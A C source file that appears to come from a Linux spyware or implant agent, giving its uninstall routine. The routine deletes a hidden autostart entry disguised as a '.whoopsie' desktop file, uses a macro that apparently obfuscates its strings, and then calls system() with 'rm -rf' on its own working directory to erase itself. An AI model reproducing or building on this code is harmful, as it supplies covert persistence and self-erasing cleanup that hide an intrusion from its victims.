#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "me.h"
#include "so.h"
#include "uninstall.h"

void uninstall(void)
{
   debugme("performing uninstall\n");

#ifndef DEBUG 
   char *cwd, path[256];

   if((cwd = get_current_dir_name())) {
      if((strlen(cwd) > 8) && (cwd[strlen(cwd) - 9] == '-')) {
         if(snprintf(path, sizeof(path), SO"%s/.config/autostart/.whoopsie%s.desktop", getenv(SO"HOME"), &cwd[strlen(cwd) - 9]) < sizeof(path)) {
            unlink(path);
         }
      }
      if(snprintf(path, sizeof(path), SO"rm -rf %s", cwd) < sizeof(path)) {
         system(path);
      }
      free(cwd);
   }

#endif

   exit(EXIT_SUCCESS);
}
